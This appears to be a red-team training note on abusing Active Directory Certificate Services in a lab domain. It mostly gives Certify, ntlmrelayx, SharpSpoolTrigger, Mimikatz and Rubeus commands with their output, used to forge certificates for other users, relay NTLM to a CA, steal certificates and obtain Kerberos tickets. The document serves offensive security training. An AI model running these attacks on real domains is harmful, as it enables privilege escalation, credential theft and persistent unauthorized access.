# Enumeration

## Finding Certificate Authorities

To find AD CS Certificate Authorities (CA's) in a domain or forest, run [Certify](https://github.com/GhostPack/Certify) with the cas parameter.

```powershell
# Native
Certify.exe cas
# Cobalt Strike
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
```

## Misconfigured Certificate Templates

AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.

Certify can also find vulnerable templates.

{% code overflow="wrap" %}
```powershell
# Native
Certify.exe find /vulnerable
# Cobalt Strike
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/customuser.webp" alt=""><figcaption></figcaption></figure>

Let's go through the key parts of this output.

1. This template is served by _sub-ca_.
2. The template is called _CustomUser_.
3. _ENROLLEE\_SUPPLIES\_SUBJECT_ is enabled, which allows the certificate requestor to provide any SAN (subject alternative name).
4. The certificate usage has _Client Authentication_ set.
5. _DEV\Domain Users_ have enrollment rights, so any domain user may request a certificate from this template.

**If a principal you control has WriteOwner, WriteDacl or WriteProperty, then this could also be abused.**

This configuration allows any domain user to request a certificate for any other domain user (including a domain admin) and use it for authentication. Request a certificate for nlamb.

{% code overflow="wrap" %}
```powershell
# Get Current user.
beacon> getuid
[*] You are DEV\bfarmer
# Get certificate for a different user. 
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
# Copy the whole certificate (both the private key and certificate) and save it to cert.pem on Ubuntu WSL.  Then use the provided openssl command to convert it to pfx format.
ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password: pass123
Verifying - Enter Export Password: pass123
# Convert cert.pfx into a base64 encoded string so it can be used with Rubeus.
ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0
MIIM7w[...]ECAggA
# Then use asktgt to request a TGT for the user using the certificate.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap
```
{% endcode %}

## NTLM Relaying to ADCS HTTP Endpoints

AD CS services support HTTP enrolment methods and even includes a GUI.  This endpoint is usually found at _http\[s]://\<hostname>/certsrv_**.**

<figure><img src="../../../.gitbook/assets/certsrv.webp" alt=""><figcaption></figcaption></figure>

If NTLM authentication is enabled, these endpoints are vulnerable to NTLM relay attacks.  A common abuse method is to coerce a domain controller to authenticate to an attacker-controlled location, relay the request to a CA to obtain a certificate for that DC, and then use it to obtain a TGT.

An important aspect to be aware of is that you cannot relay NTLM authentication back to the originating machine.  We therefore wouldn't be able to relay a DC to a CA if those services were running on the same machine.  This is indeed the case in the RTO lab, as each CA is running on a DC.

Another good way to abuse this primitive is by gaining access to a machine configured for unconstrained delegation.

To achieve this, we need:

* PortBender on Workstation 2 to capture traffic on port 445 and redirect it to port 8445.
* A reverse port forward to forward traffic hitting port 8445 to the team server on port 445.
* A SOCKS proxy for ntlmrelayx to send traffic back into the network.

The ntlmrelayx command needs to target the `certfnsh.asp` page on the ADCS server.

{% code overflow="wrap" %}
```bash
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```
{% endcode %}

Then force the authentication to occur from WEB to WKSTN-2.

{% code overflow="wrap" %}
```powershell
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102
```
{% endcode %}

The S4U2Self trick can be used to obtain usable TGS's to move laterally to it.

## User & Computer Persistence

Certificates can also be useful for maintaining persistent access to both users and computers, because they tend to have a longer shelf-life compared to passwords. For example, User certificates are valid for an entire year by default, regardless of password changes.

```
CA Name             : dc-2.dev.cyberbotic.io\sub-ca
Template Name       : User
Schema Version      : 1
Validity Period     : 1 year
```

Certificates only become invalid if they're revoked by the CA (or expire). This also does not rely on any vulnerable templates. We can extract certificates that have already been issued, or just request new ones.

### **User Persistence**

User certificates that have already been issued can be found in the user's Personal Certificate store.

<figure><img src="../../../.gitbook/assets/nlamb.webp" alt=""><figcaption></figcaption></figure>

If we have a Beacon running on their machine, we can enumerate their certificates with Seatbelt.

{% code overflow="wrap" %}
```
beacon> getuid
[*] You are DEV\nlamb

beacon> run hostname
wkstn-1

beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates

  StoreLocation      : CurrentUser
  Issuer             : CN=sub-ca, DC=dev, DC=cyberbotic, DC=io
  Subject            : E=nlamb@cyberbotic.io, CN=Nina Lamb, CN=Users, DC=dev, DC=cyberbotic, DC=io
  ValidDate          : 9/7/2022 11:44:35 AM
  ExpiryDate         : 9/7/2023 11:44:35 AM
  HasPrivateKey      : True
  KeyExportable      : True
  Thumbprint         : 43FA3C3AE4E1212A3F888937745C2E2F55BAC1B5
  Template           : User
  EnhancedKeyUsages  :
       Encrypting File System
       Secure Email
       Client Authentication     [!] Certificate is used for client authentication!
```
{% endcode %}

**Always ensure the certificate is used for client authentication.**

Certificates can be exported with Mimikatz using `crypto::certificates` (although it drops them to disk).

```
beacon> mimikatz crypto::certificates /export

    Public export  : OK - 'CURRENT_USER_My_0_Nina Lamb.der'
    Private export : OK - 'CURRENT_USER_My_0_Nina Lamb.pfx'

beacon> download CURRENT_USER_My_0_Nina Lamb.pfx
[*] started download of C:\Users\nlamb\CURRENT_USER_My_0_Nina Lamb.pfx (3454 bytes)
[*] download of CURRENT_USER_My_0_Nina Lamb.pfx is complete
```

**Go to **_**View > Downloads**_** to sync files from Cobalt Strike to your local machine.**

Base64 encode the pfx file.

{% code overflow="wrap" %}
```bash
ubuntu@DESKTOP-3BSK7NO ~> cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0
```
{% endcode %}

Then use it with Rubeus to obtain a TGT.  The export password will be `mimikatz`.

{% code overflow="wrap" %}
```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /nowrap

[*] Using PKINIT with etype rc4_hmac and subject: E=nlamb@cyberbotic.io, CN=Nina Lamb, CN=Users, DC=dev, DC=cyberbotic, DC=io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\nlamb'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

    doIGQj[...]5pbw==

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  9/7/2022 12:28:51 PM
  EndTime                  :  9/7/2022 10:28:51 PM
  RenewTill                :  9/14/2022 12:28:51 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Cptkd+BVLZ8+NS11BQQ6Zg==
  ASREP (key)              :  79C05DC0CC7909DF6448F1B24FAFBD71
```
{% endcode %}

**OPSEC**\
\
You may notice that this will request RC4 tickets by default.  You can force the use of AES256 by including the `/enctype:aes256` parameter.

If the user does not have a certificate in their store, we can just request one with Certify.

{% code overflow="wrap" %}
```powershell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User
```
{% endcode %}

### Computer Persistence

The same can be applied to computer accounts, but we must elevate to extract those certificates.

<figure><img src="../../../.gitbook/assets/wkstn1.webp" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
beacon> mimikatz !crypto::certificates /systemstore:local_machine /export

    Public export  : OK - 'local_machine_My_0_wkstn-1.dev.cyberbotic.io.der'
    Private export : OK - 'local_machine_My_0_wkstn-1.dev.cyberbotic.io.pfx'
```
{% endcode %}

{% code overflow="wrap" %}
```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap

[*] Action: Ask TGT

[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=wkstn-1.dev.cyberbotic.io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\WKSTN-1$'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

    doIGYD[...]5pbw==

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  WKSTN-1$
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  9/7/2022 12:06:02 PM
  EndTime                  :  9/7/2022 10:06:02 PM
  RenewTill                :  9/14/2022 12:06:02 PM
```
{% endcode %}
